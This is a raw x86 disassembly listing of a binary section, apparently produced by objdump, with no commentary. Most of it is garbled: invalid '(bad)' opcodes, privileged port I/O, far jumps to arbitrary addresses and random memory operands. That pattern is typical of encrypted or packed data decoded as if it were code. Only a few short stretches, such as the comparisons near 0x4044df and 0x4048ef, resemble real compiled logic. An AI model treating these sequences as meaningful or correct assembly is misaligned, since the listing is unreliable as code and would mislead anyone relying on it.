  404202:	clc    
  404203:	pop    ds
  404204:	add    eax,0x7c5e4b30
  404209:	scas   al,BYTE PTR es:[edi]
  40420a:	mov    bl,ch
  40420c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40420d:	sub    DWORD PTR [edi],edi
  40420f:	add    cl,BYTE PTR [ecx+0x43904bb4]
  404215:	ja     0x40419a
  404217:	js     0x40419b
  404219:	cmp    BYTE PTR ds:0x6b51005c,al
  40421f:	in     eax,0x88
  404221:	repnz out dx,al
  404223:	aad    0xe2
  404225:	or     DWORD PTR [esi],ebp
  404227:	out    dx,eax
  404228:	sbb    dh,cl
  40422a:	jle    0x4042a8
  40422c:	jp     0xdac057de
  404232:	adc    DWORD PTR [edi+0x463c4eb8],eax
  404238:	sbb    al,0x55
  40423a:	out    dx,al
  40423b:	mov    ebp,0xced35b91
  404240:	push   ds
  404241:	test   al,0x65
  404243:	sub    BYTE PTR [ecx-0x37598ea5],dl
  404249:	dec    edi
  40424a:	pop    eax
  40424b:	test   DWORD PTR [ecx],0xc054e1c1
  404251:	int    0x24
  404253:	lds    edi,FWORD PTR [ecx+ebx*1-0x56]
  404257:	pusha  
  404258:	add    cl,BYTE PTR [ecx]
  40425a:	jmp    0x4431:0x90e6ece8
  404261:	les    ebp,FWORD PTR [esi+0x7195eeee]
  404267:	(bad)  
  404268:	out    dx,al
  404269:	push   ebp
  40426a:	std    
  40426b:	and    al,BYTE PTR [eax-0x762ccee3]
  404271:	adc    al,ch
  404273:	push   esp
  404274:	int    0xbb
  404276:	fnsave [ecx-0x30d92192]
  40427c:	and    al,0xb1
  40427e:	enter  0x34b1,0x5b
  404282:	cmp    BYTE PTR [eax+0x3e4f761e],ah
  404288:	jne    0x4042b7
  40428a:	sub    BYTE PTR [ebx],ch
  40428c:	dec    edi
  40428d:	inc    esi
  40428e:	inc    esi
  40428f:	fiadd  WORD PTR [ebx]
  404291:	imul   ecx,DWORD PTR [ebx-0x1f],0xf5393c52
  404298:	push   0xffffff96
  40429a:	sahf   
  40429b:	fxch   st(3)
  40429d:	adc    ecx,DWORD PTR ds:0x67d64db3
  4042a3:	xor    bh,ch
  4042a5:	(bad)
  4042a8:	shl    ah,0xe3
  4042ab:	add    esp,esp
  4042ad:	imul   ebx,eax,0xc529e3fd
  4042b3:	and    dl,bl
  4042b5:	mul    BYTE PTR cs:[ebx]
  4042b8:	pop    edi
  4042b9:	dec    ecx
  4042ba:	lds    esi,FWORD PTR [ebp-0x68]
  4042bd:	out    0xc3,eax
  4042bf:	mov    BYTE PTR [ebp-0x5bc553c1],dh
  4042c5:	sbb    bl,BYTE PTR [ebp-0x786e3c0e]
  4042cb:	and    BYTE PTR [edx-0x7788ee12],0x1
  4042d2:	mov    bh,0x8a
  4042d4:	inc    ebp
  4042d5:	arpl   WORD PTR [ecx+esi*4-0x3c],dx
  4042d9:	pop    ecx
  4042da:	repnz in eax,0x6d
  4042dd:	clc    
  4042de:	clc    
  4042df:	rol    BYTE PTR [edi+0x1c],0x96
  4042e3:	push   ebp
  4042e4:	retf   0xaa
  4042e7:	arpl   WORD PTR [ecx-0x50],bx
  4042ea:	shr    ch,1
  4042ec:	jo     0x404360
  4042ee:	arpl   WORD PTR [ebp-0x19],si
  4042f1:	xchg   ebp,eax
  4042f2:	push   ebx
  4042f3:	ror    edx,0xac
  4042f6:	or     dh,BYTE PTR [esi+0x64fe6713]
  4042fc:	sub    eax,0x3d342fab
  404301:	cli    
  404302:	add    DWORD PTR [ecx],eax
  404304:	push   ds
  404305:	fdivr  st,st(5)
  404307:	not    DWORD PTR [edx-0x24]
  40430a:	hlt    
  40430b:	scas   al,BYTE PTR es:[edi]
  40430c:	xor    dl,bh
  40430e:	aad    0xce
  404310:	(bad)  
  404311:	mov    ebp,0x9c1b48d1
  404316:	mov    dh,0x81
  404318:	scas   al,BYTE PTR es:[edi]
  404319:	mov    DWORD PTR ss:[esi+0x73a81286],0xc7111cd
  404324:	pop    ds
  404325:	fsub   st,st(1)
  404327:	(bad)  
  404328:	pop    ds
  404329:	call   0xb5b8c115
  40432e:	mov    esp,0x8763092e
  404333:	xchg   BYTE PTR [edi-0x65d0f4e2],dl
  404339:	xchg   DWORD PTR [esi+esi*8],ebx
  40433c:	xlat   BYTE PTR ds:[ebx]
  40433d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40433e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40433f:	mov    esi,ebx
  404341:	jae    0x4042fc
  404343:	out    0x3c,eax
  404345:	and    DWORD PTR [edx+0x20],esi
  404348:	stc    
  404349:	xchg   ebp,eax
  40434a:	jg     0x404335
  40434c:	pop    ss
  40434d:	in     al,0x74
  40434f:	mov    al,0xce
  404351:	iret   
  404352:	push   cs
  404353:	push   esi
  404354:	and    DWORD PTR [ebx+0x77],ecx
  404357:	sar    DWORD PTR [esi+0x536d9ff3],0x30
  40435e:	inc    edx
  40435f:	xlat   BYTE PTR ds:[ebx]
  404360:	out    dx,al
  404361:	fistp  DWORD PTR [edi+0x3a]
  404364:	jbe    0x4043b7
  404366:	mov    bl,0xcf
  404368:	cwde   
  404369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40436a:	sub    cl,BYTE PTR [ebx+ebx*2+0x33]
  40436e:	pop    ebp
  40436f:	(bad)  
  404370:	icebp  
  404371:	lds    edi,FWORD PTR [ebx]
  404373:	aad    0x26
  404375:	xchg   ebx,eax
  404376:	jo     0x404316
  404378:	jo     0x40439c
  40437a:	dec    ebp
  40437b:	mov    WORD PTR [ebp+0x76],?
  40437e:	and    ebx,DWORD PTR [esi+eiz*1+0x7946ccf3]
  404385:	loop   0x40433c
  404387:	(bad)  
  404388:	fcom   QWORD PTR [edi+0x23]
  40438b:	ror    DWORD PTR [edx+ecx*4+0x40],1
  40438f:	mov    ah,0x97
  404391:	jl     0x404314
  404393:	fdivr  QWORD PTR [ebp+0x4b861402]
  404399:	mov    ds:0x260856de,al
  40439e:	mov    cl,0xc5
  4043a0:	int    0x9a
  4043a2:	sub    al,0x20
  4043a4:	or     edx,DWORD PTR [ebx+ebp*8]
  4043a7:	inc    eax
  4043a8:	aas    
  4043a9:	test   eax,0xff5bc69f
  4043af:	push   edx
  4043b0:	mov    esp,0x2fb555e
  4043b5:	les    esi,FWORD PTR [eax]
  4043b7:	xchg   edx,eax
  4043b8:	sbb    al,0xba
  4043ba:	sub    esi,DWORD PTR [edi]
  4043bc:	pushf  
  4043bd:	pop    edi
  4043be:	xchg   ecx,eax
  4043bf:	(bad)  
  4043c0:	loope  0x404426
  4043c2:	fist   DWORD PTR [esi-0x58]
  4043c5:	or     DWORD PTR [ecx+0xee01a61],esi
  4043cb:	ficomp WORD PTR [ecx]
  4043cd:	mov    ds:0x565b65a0,al
  4043d2:	xchg   DWORD PTR [ecx+0x20],ebx
  4043d5:	aad    0x85
  4043d7:	sbb    bh,BYTE PTR [edi]
  4043d9:	mov    ebp,0xb4523f6d
  4043de:	adc    al,0x65
  4043e0:	xlat   BYTE PTR ds:[ebx]
  4043e1:	das    
  4043e2:	pop    ds
  4043e3:	push   eax
  4043e4:	jne    0x404429
  4043e6:	sbb    cl,BYTE PTR ds:0x8e14606f
  4043ec:	xlat   BYTE PTR ds:[ebx]
  4043ed:	mov    ds:0xa7d12db8,eax
  4043f2:	loop   0x404419
  4043f4:	in     eax,0x15
  4043f6:	(bad)  
  4043f7:	xor    ebp,edi
  4043f9:	(bad)  
  4043fa:	mov    DWORD PTR [esi+0x69],ebp
  4043fd:	jmp    0x4043b1
  4043ff:	outs   dx,BYTE PTR ds:[esi]
  404400:	fsub   DWORD PTR [ebp-0x58]
  404403:	add    DWORD PTR [edi+0x54],ebx
  404406:	adc    dl,BYTE PTR [edi+0x22856e15]
  40440c:	fs adc dh,bl
  40440f:	push   cs
  404410:	scas   eax,DWORD PTR es:[edi]
  404411:	or     ah,dl
  404413:	inc    ecx
  404414:	or     DWORD PTR [eax],edx
  404416:	mov    edi,0x8042489a
  40441b:	dec    eax
  40441c:	stos   DWORD PTR es:[edi],eax
  40441d:	xchg   edi,esi
  40441f:	cmc    
  404420:	ds scas al,BYTE PTR es:[edi]
  404422:	jae    0x404448
  404424:	int3   
  404425:	cwde   
  404426:	xchg   edi,eax
  404427:	repz fiadd DWORD PTR [ebp+0x2]
  40442b:	dec    ebp
  40442c:	mov    dh,0x26
  40442e:	mov    ecx,0x535220d6
  404433:	les    esp,FWORD PTR [eax+0x18]
  404436:	(bad)  
  404437:	dec    ebx
  404438:	pop    edi
  404439:	enter  0xeda9,0x8f
  40443d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40443e:	sti    
  40443f:	mov    bh,0x6f
  404441:	test   BYTE PTR [ecx],0x30
  404444:	fsub   QWORD PTR ds:0x92d11988
  40444a:	jp     0x4043fa
  40444c:	inc    edx
  40444d:	cmp    eax,0xc6b38fe2
  404452:	mov    ebp,0x39ed75f
  404457:	pop    ds
  404458:	outs   dx,DWORD PTR ds:[esi]
  404459:	mov    bh,0x94
  40445b:	aas    
  40445c:	adc    esi,DWORD PTR [ecx*2+0x46e19530]
  404463:	pusha  
  404464:	and    bh,BYTE PTR [ebx+0x3edc5ca9]
  40446a:	nop
  40446b:	cmp    eax,0x48d17b9
  404470:	test   al,0x9e
  404472:	jnp    0x404442
  404474:	out    dx,eax
  404475:	adc    ecx,ebp
  404477:	jp     0x404427
  404479:	xchg   ebp,eax
  40447a:	repnz push edi
  40447c:	inc    esp
  40447d:	not    DWORD PTR [edx-0x6910440d]
  404483:	sahf   
  404484:	(bad)  
  404485:	popf   
  404486:	int3   
  404487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404488:	sub    eax,0xd7f7b8dd
  40448d:	and    BYTE PTR [edi],bh
  40448f:	xchg   BYTE PTR es:[esi],ch
  404492:	mov    eax,es
  404494:	je     0x404459
  404496:	pop    es
  404497:	and    ebx,esp
  404499:	out    dx,al
  40449a:	sar    DWORD PTR ds:0x6873cd5d,cl
  4044a0:	mov    ah,0xd0
  4044a2:	imul   esi,edi,0x2f0cf13b
  4044a8:	call   0x8e2d:0x48aaa3c
  4044af:	adc    BYTE PTR [edi+0x5b],0xeb
  4044b3:	nop
  4044b4:	inc    ebp
  4044b5:	inc    eax
  4044b6:	lock jecxz 0x4044d2
  4044b9:	(bad)  
  4044ba:	xor    al,0xd
  4044bc:	out    dx,al
  4044bd:	pop    ebx
  4044be:	rol    BYTE PTR [ebp-0x14a0e3f4],0x7d
  4044c5:	add    DWORD PTR [edx+0x52e6dded],esi
  4044cb:	add    ebp,DWORD PTR [ecx-0x7556dcea]
  4044d1:	inc    esp
  4044d2:	add    eax,0xff558aa8
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	cli    
  40450c:	mov    edi,0x27ebe1f4
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x40458c
  404518:	aam    0x17
  40451a:	stos   DWORD PTR es:[edi],eax
  40451b:	mov    al,BYTE PTR [edx+0x6a99efc6]
  404521:	push   ss
  404522:	mov    ds:0x6583abd1,al
  404527:	(bad)  
  404528:	mov    ch,0xc8
  40452a:	inc    edx
  40452b:	push   esp
  40452c:	mov    BYTE PTR [eax],bl
  40452e:	aad    0x25
  404530:	int3   
  404531:	jge    0x4044c8
  404533:	imul   ebp,DWORD PTR [edx],0xffffffd4
  404536:	mov    al,0x77
  404538:	push   esi
  404539:	cmp    eax,0x84b98ad0
  40453e:	xchg   ebp,eax
  40453f:	ret    0xe6f1
  404542:	or     ecx,DWORD PTR [ebx-0x6d3a9444]
  404548:	push   ds
  404549:	xor    al,0x5
  40454b:	ja     0x40455e
  40454d:	and    edi,DWORD PTR [edi-0x4c7487e5]
  404553:	aas    
  404554:	dec    edx
  404555:	xor    ebx,DWORD PTR ds:[ebp+0x1e]
  404559:	jnp    0x404505
  40455b:	lea    eax,[edi]
  40455d:	mov    WORD PTR [eax-0x4d],?
  404560:	call   0xc62:0x1ed62382
  404567:	lahf   
  404568:	in     eax,dx
  404569:	add    al,0xaa
  40456b:	lea    edx,[edx]
  40456d:	and    BYTE PTR [edi-0x7ee02b63],0x87
  404574:	cmp    BYTE PTR [esi-0x6f3e17d3],0x5c
  40457b:	fisub  WORD PTR [eax+ebp*8+0x7d41d56a]
  404582:	push   ebp
  404583:	pop    esp
  404584:	call   0xfd1f:0x8b9406c7
  40458b:	push   ebp
  40458c:	repnz xchg ecx,eax
  40458e:	xchg   ebp,eax
  40458f:	fcom   DWORD PTR [ecx-0x29]
  404592:	sbb    cl,BYTE PTR [ebx]
  404594:	or     edx,eax
  404596:	mov    ebp,0x18cbae1a
  40459b:	adc    al,0xf0
  40459d:	neg    DWORD PTR [eax+eax*4]
  4045a0:	push   ebx
  4045a1:	inc    edx
  4045a2:	dec    ebx
  4045a3:	aam    0xd9
  4045a5:	add    eax,0xf05a10dc
  4045aa:	mov    ds:0xc377de01,eax
  4045af:	mov    cl,0xbf
  4045b1:	retf   
  4045b2:	fs mov esi,0xe2a060d9
  4045b8:	push   cs
  4045b9:	push   ss
  4045ba:	sbb    dl,BYTE PTR [ebx+0xfcc0c10]
  4045c0:	xchg   esi,eax
  4045c1:	aaa    
  4045c2:	arpl   WORD PTR [eax+ebp*8],di
  4045c5:	stos   DWORD PTR es:[edi],eax
  4045c6:	push   ss
  4045c7:	arpl   WORD PTR [edx+eiz*1],sp
  4045ca:	call   0xee3e5ac0
  4045cf:	push   ds
  4045d0:	lods   al,BYTE PTR ds:[esi]
  4045d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045d2:	pusha  
  4045d3:	dec    esi
  4045d4:	xor    BYTE PTR [ecx-0x21],ch
  4045d7:	sti    
  4045d8:	push   edx
  4045d9:	push   ecx
  4045da:	sbb    dl,BYTE PTR [edx-0x6e]
  4045dd:	mov    ebp,0x14e7c92e
  4045e2:	aas    
  4045e3:	ret    
  4045e4:	sub    edi,DWORD PTR [ebx]
  4045e6:	xor    al,0x5c
  4045e8:	in     eax,dx
  4045e9:	rcl    DWORD PTR [ebp+0x51b2311d],1
  4045ef:	or     esi,esi
  4045f1:	lahf   
  4045f2:	mov    ecx,0xa5a338ff
  4045f7:	add    esp,ebp
  4045f9:	aam    0x2c
  4045fb:	ins    BYTE PTR es:[edi],dx
  4045fc:	jl     0x404613
  4045fe:	cli    
  4045ff:	dec    ecx
  404600:	loope  0x404603
  404602:	sbb    ebx,DWORD PTR [eax]
  404604:	and    eax,0x40ce44b2
  404609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40460a:	jnp    0x4045b3
  40460c:	or     BYTE PTR [edi+0x1ea032fb],bh
  404612:	push   0xe329166d
  404617:	xlat   BYTE PTR ds:[ebx]
  404618:	inc    edx
  404619:	mov    cl,0x4f
  40461b:	mov    ch,0x72
  40461d:	jb     0x40462d
  40461f:	pop    ss
  404620:	push   esi
  404621:	cmovo  esi,DWORD PTR [edi+0x46]
  404625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404626:	mov    dl,0xc
  404628:	mov    bl,0x1b
  40462a:	ret    
  40462b:	xor    DWORD PTR [ebx+0x7344b013],ebx
  404631:	jle    0x404673
  404633:	jl     0x4045b5
  404635:	inc    eax
  404636:	dec    ebx
  404637:	mov    esi,0x6f7806cf
  40463c:	mov    ecx,0x702d9f64
  404641:	push   esi
  404642:	jmp    0x404652
  404644:	lea    ebp,[ebx-0x6513594e]
  40464a:	pop    edx
  40464b:	sub    BYTE PTR [edx],ch
  40464d:	inc    eax
  40464e:	cmp    bl,dl
  404650:	push   esi
  404651:	mul    BYTE PTR [ebx]
  404653:	jno    0x4046a2
  404655:	pushf  
  404656:	popf   
  404657:	nop
  404658:	sub    al,0x49
  40465a:	call   0x58c43b76
  40465f:	ret    
  404660:	out    dx,eax
  404661:	inc    edi
  404662:	in     eax,dx
  404663:	push   es
  404664:	jo     0x40468b
  404666:	retf   
  404667:	out    0x5f,al
  404669:	xlat   BYTE PTR ds:[ebx]
  40466a:	(bad)  
  40466b:	hlt    
  40466c:	xchg   BYTE PTR [edx+esi*4],ah
  40466f:	aam    0xdd
  404671:	lds    esi,FWORD PTR [eax+esi*1-0x543e4f64]
  404678:	(bad)  
  404679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40467a:	in     al,0x84
  40467c:	dec    esi
  40467d:	push   0xffffff99
  40467f:	sbb    BYTE PTR [edi+0x52634e75],bh
  404685:	and    dh,BYTE PTR [edx+0x105cb9e6]
  40468b:	sub    BYTE PTR [ebp+ecx*8-0x20c980bd],ch
  404692:	sbb    ecx,DWORD PTR [edx+0x5e]
  404695:	sub    ecx,0x5d
  404698:	add    bh,BYTE PTR [ebx-0x38b2fd98]
  40469e:	xor    bh,BYTE PTR [ebp-0x194614e4]
  4046a4:	adc    eax,0x80e1172f
  4046a9:	adc    DWORD PTR [ecx+0x5053ec68],0x6f
  4046b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046b1:	out    dx,eax
  4046b2:	outs   dx,BYTE PTR ds:[esi]
  4046b3:	or     esp,edi
  4046b5:	or     ah,BYTE PTR [eax]
  4046b7:	mov    ah,cl
  4046b9:	in     eax,dx
  4046ba:	(bad)  
  4046bc:	sti    
  4046bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046be:	in     al,dx
  4046bf:	fwait
  4046c0:	outs   dx,BYTE PTR ds:[esi]
  4046c1:	cdq    
  4046c2:	pop    esp
  4046c3:	mov    edi,0xa2156730
  4046c8:	cmp    DWORD PTR [edi*8-0xf01664c],0x60
  4046d0:	stos   DWORD PTR es:[edi],eax
  4046d1:	cdq    
  4046d2:	mov    ecx,0xb5c75919
  4046d7:	scas   eax,DWORD PTR es:[edi]
  4046d8:	(bad)  
  4046d9:	test   BYTE PTR [edi],0xd7
  4046dc:	xor    ch,BYTE PTR [ebx]
  4046de:	pusha  
  4046df:	mov    dh,0x4c
  4046e1:	sbb    bh,BYTE PTR [edi]
  4046e3:	leave  
  4046e4:	(bad)  [ebp+0x5]
  4046e7:	lea    ebp,[ecx]
  4046e9:	inc    BYTE PTR [ecx-0x5e]
  4046ec:	xor    eax,DWORD PTR [ecx]
  4046ee:	test   al,0x9b
  4046f0:	sar    dh,1
  4046f2:	rcr    BYTE PTR ds:0xb968abe4,1
  4046f8:	call   0xfd0c:0xff44739a
  4046ff:	(bad)  
  404700:	pop    edx
  404701:	shr    DWORD PTR [esi-0x29d5b188],0x8
  404708:	mov    WORD PTR [ebx-0x38],ds
  40470b:	(bad)  
  40470c:	jmp    0x4046db
  40470e:	cmp    BYTE PTR [esi-0x3ad7b380],al
  404714:	push   edx
  404715:	xor    esi,eax
  404717:	add    BYTE PTR [edi],al
  404719:	jo     0x40472d
  40471b:	cli    
  40471c:	sbb    DWORD PTR [ecx],esp
  40471e:	in     al,0xf
  404720:	dec    ecx
  404721:	add    ch,ch
  404723:	cs pop esp
  404725:	xlat   BYTE PTR ds:[ebx]
  404726:	clc    
  404727:	js     0x404700
  404729:	xlat   BYTE PTR ds:[ebx]
  40472a:	jno    0x40478b
  40472c:	es jge 0x404725
  40472f:	push   ss
  404730:	js     0x40472d
  404732:	cmp    esp,DWORD PTR [edx+ecx*2+0x6f0a0fa3]
  404739:	imul   ebx,DWORD PTR [esi-0x73bc8df8],0xffffff8f
  404740:	sbb    BYTE PTR [esi+0x6d],0x4a
  404744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404745:	jl     0x40470b
  404747:	sub    eax,0x34c2e50c
  40474c:	std    
  40474d:	mov    esi,DWORD PTR [edx]
  40474f:	or     ebx,DWORD PTR [eax+0x62087561]
  404755:	jl     0x4047c9
  404757:	fnstenv [eax-0x80]
  40475a:	mov    bh,0x36
  40475c:	iret   
  40475d:	push   ss
  40475e:	je     0x4046f0
  404760:	int3   
  404761:	rcl    eax,1
  404763:	xchg   BYTE PTR cs:[esi-0x3d],bl
  404767:	enter  0xa23d,0x6a
  40476b:	xchg   ebx,eax
  40476c:	loopne 0x4047bc
  40476e:	pusha  
  40476f:	(bad)  
  404771:	pop    edx
  404772:	mov    DWORD PTR [ecx-0x45],esp
  404775:	pand   mm4,mm4
  404778:	lods   al,BYTE PTR ds:[esi]
  404779:	ss fxch st(1)
  40477c:	xchg   ebp,eax
  40477d:	ja     0x4047e6
  40477f:	cwde   
  404780:	mov    eax,0x7256110f
  404785:	lea    ebp,[edi-0x5eda78fd]
  40478b:	or     al,0xf2
  40478d:	ret    0xf05
  404790:	addr16 cdq 
  404792:	test   esp,edx
  404794:	or     DWORD PTR [ebp-0x641747c1],0x20
  40479b:	push   edx
  40479c:	ret    
  40479d:	sbb    DWORD PTR [edx-0x6ac47241],ebp
  4047a3:	enter  0x42a,0x8
  4047a7:	jp     0x404803
  4047a9:	pop    esi
  4047aa:	push   esp
  4047ab:	mov    bl,0xe0
  4047ad:	fwait
  4047ae:	aas    
  4047af:	pop    esp
  4047b0:	das    
  4047b1:	sbb    eax,0xc0ce4d0d
  4047b6:	inc    eax
  4047b7:	inc    BYTE PTR [edx-0x7184a8ad]
  4047bd:	xor    esi,ebx
  4047bf:	imul   ebx,DWORD PTR [edx+0x281ab17c],0xfffffff8
  4047c6:	xlat   BYTE PTR ds:[ebx]
  4047c7:	or     ch,BYTE PTR [ebx+0x51]
  4047ca:	xchg   edi,eax
  4047cb:	sbb    dh,ch
  4047cd:	mov    cl,0x5f
  4047cf:	mov    al,ds:0x540961a0
  4047d4:	jb     0x4047d6
  4047d6:	fwait
  4047d7:	mov    esi,0xba52f805
  4047dc:	lds    ecx,FWORD PTR ds:0x3210ec58
  4047e2:	popf   
  4047e3:	test   al,0x49
  4047e5:	fsub   DWORD PTR [eax-0x3d]
  4047e8:	and    al,0xa4
  4047ea:	rcl    DWORD PTR [edx-0x2d],cl
  4047ed:	sbb    ebx,DWORD PTR [eax+0x4ba49e4b]
  4047f3:	rcl    DWORD PTR [ecx+0x7a],cl
  4047f6:	or     eax,DWORD PTR [ecx]
  4047f8:	dec    edx
  4047f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047fa:	sbb    al,0xd5
  4047fc:	inc    ecx
  4047fd:	div    DWORD PTR [eax]
  4047ff:	sub    edx,DWORD PTR [edx-0x3a]
  404802:	jecxz  0x40482e
  404804:	jmp    0x59517a3
  404809:	mov    esp,0x933a027d
  40480e:	fistp  QWORD PTR [edx+0x37149248]
  404814:	(bad)  [ebx-0x7ecdad21]
  40481a:	mov    es,WORD PTR ds:0x65413ca
  404820:	xor    al,0xf1
  404822:	outs   dx,BYTE PTR ds:[esi]
  404823:	mov    edi,edi
  404825:	repz data16 xlat BYTE PTR ds:[ebx]
  404828:	addr16 inc esi
  40482a:	sub    edi,esp
  40482c:	clc    
  40482d:	dec    ebp
  40482e:	mov    ch,0x24
  404830:	cwde   
  404831:	mov    al,BYTE PTR [esp+edx*1+0x6d1712a4]
  404838:	and    ebx,DWORD PTR [edi+0x7513ce6e]
  40483e:	jle    0x40487a
  404840:	cmp    al,0xca
  404842:	dec    DWORD PTR [ecx-0x66]
  404845:	sub    al,0xad
  404847:	in     eax,0x5d
  404849:	mov    ecx,esp
  40484b:	aam    0x5c
  40484d:	mov    ebp,0x55e1552c
  404852:	aaa    
  404853:	add    esp,edi
  404855:	scas   al,BYTE PTR es:[edi]
  404856:	mov    bh,BYTE PTR [eax+0x1322a337]
  40485c:	dec    ebp
  40485d:	ins    DWORD PTR es:[edi],dx
  40485e:	mov    esi,0xffc1a045
  404863:	jb     0x404866
  404865:	shl    ch,0x36
  404868:	popa   
  404869:	cld    
  40486a:	jb     0x4048ae
  40486c:	in     eax,0x29
  40486e:	sbb    eax,0x654c6008
  404873:	in     al,dx
  404874:	and    al,0x24
  404876:	ins    BYTE PTR es:[edi],dx
  404877:	fsubp  st(2),st
  404879:	and    ch,al
  40487b:	pop    ebx
  40487c:	icebp  
  40487d:	and    eax,DWORD PTR [ebp+0x76]
  404880:	or     esp,edx
  404882:	ins    DWORD PTR es:[edi],dx
  404883:	shr    DWORD PTR [ebx],0xb2
  404886:	add    BYTE PTR [esi+eax*4-0x79],ah
  40488a:	lahf   
  40488b:	mov    dl,0x11
  40488d:	ins    DWORD PTR es:[edi],dx
  40488e:	fisub  DWORD PTR ds:0xfb7db926
  404894:	sar    DWORD PTR [eax-0xb44b74c],cl
  40489a:	dec    edx
  40489b:	ficomp WORD PTR [ebx+0x37447289]
  4048a1:	xor    BYTE PTR [esi+0x5],0x14
  4048a5:	and    dl,BYTE PTR [ebp+0x5a9348d0]
  4048ab:	or     edi,ebp
  4048ad:	ins    BYTE PTR es:[edi],dx
  4048ae:	shr    BYTE PTR [eax-0x368bcbcc],1
  4048b4:	add    BYTE PTR ds:0x85079313,ah
  4048ba:	mov    bl,0xf1
  4048bc:	out    0x32,al
  4048be:	inc    ebp
  4048bf:	pusha  
  4048c0:	fcomp  st(4)
  4048c2:	xchg   edx,eax
  4048c3:	and    al,0x60
  4048c5:	fcom   DWORD PTR [esi]
  4048c7:	in     al,dx
  4048c8:	sub    dh,BYTE PTR ds:0xc540d1bb
  4048ce:	scas   eax,DWORD PTR es:[edi]
  4048cf:	imul   esi,DWORD PTR [ebp-0x2b],0x27
  4048d3:	cmp    BYTE PTR [ebx-0x2d],bl
  4048d6:	std    
  4048d7:	sar    DWORD PTR ds:0xf2da7cb2,cl
  4048dd:	test   al,0x47
  4048df:	(bad)  [edi+0x1d]
  4048e2:	in     al,dx
  4048e3:	imul   BYTE PTR [ebx+0x1d]
  4048e6:	dec    eax
  4048e7:	pushf  
  4048e8:	shr    DWORD PTR [ebp+0x3],1
  4048eb:	pop    ecx
  4048ec:	jmp    0x4048d2
  4048ee:	popa   
  4048ef:	xor    eax,ecx
  4048f1:	add    eax,esi
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40491a:	dec    eax
  40491b:	jnp    0x404920
  40491d:	ret    
  40491e:	and    edi,DWORD PTR [esi+0x7e]
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x404938
  404926:	xchg   BYTE PTR cs:[edi],bl
  404929:	mov    bl,0x6a
  40492b:	jge    0x404929
  40492d:	xchg   esp,eax
  40492e:	xchg   ebx,eax
  40492f:	dec    edi
  404930:	push   esi
  404931:	shl    DWORD PTR [edi+0x30],1
  404934:	jl     0x4048dd
  404936:	fiadd  DWORD PTR [ecx+edx*1]
  404939:	fmulp  st(2),st
  40493b:	jae    0x404929
  40493d:	cmp    DWORD PTR [edi],ebx
  40493f:	cli    
  404940:	push   ecx
  404941:	push   edi
  404942:	sub    eax,0xc3e361e7
  404947:	jbe    0x40495f
  404949:	xchg   esi,eax
  40494a:	dec    edi
  40494b:	ins    DWORD PTR es:[edi],dx
  40494c:	xor    edi,eax
  40494e:	js     0x404977
  404950:	xchg   ebp,eax
  404951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404952:	(bad)  
  404954:	cmp    DWORD PTR [edi],ebx
  404956:	add    eax,0x53765275
  40495b:	std    
  40495c:	rol    BYTE PTR [eax+0x28],0x37
  404960:	clc    
  404961:	push   edi
  404962:	neg    bh
  404964:	mov    DWORD PTR [ebp-0x24],edx
  404967:	xchg   esp,eax
  404968:	std    
  404969:	jmp    0x404972
  40496b:	inc    ecx
  40496c:	xor    DWORD PTR [edi],0xb991cd00
  404972:	add    eax,0xd7735d
  404977:	(bad)  [ebx-0x70]
  40497a:	retf   0xfc2c
  40497d:	xchg   ebx,eax
  40497e:	dec    esi
  40497f:	fidivr WORD PTR [edi+0x5f663bd]
  404985:	or     ah,dl
  404987:	dec    ebp
  404988:	mov    bl,ch
  40498a:	adc    cl,BYTE PTR [ebx+0x47]
  40498d:	clc    
  40498e:	add    DWORD PTR [ecx],esi
  404990:	push   ebp
  404991:	div    DWORD PTR [esi]
  404993:	pop    ebp
  404994:	outs   dx,DWORD PTR ds:[esi]
  404995:	repnz fild WORD PTR [edx+ebx*8+0x24]
  40499a:	test   eax,0xd3ca0159
  40499f:	nop
  4049a0:	aaa    
  4049a1:	adc    eax,0x5f556d9c
  4049a6:	adc    eax,0x40f2dd4a
  4049ab:	jle    0x4049f3
  4049ad:	dec    edi
  4049ae:	sub    BYTE PTR [edx],ah
  4049b0:	scas   eax,DWORD PTR es:[edi]
  4049b1:	adc    dh,BYTE PTR [edi]
  4049b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049b4:	jl     0x404a16
  4049b6:	dec    edi
  4049b7:	inc    eax
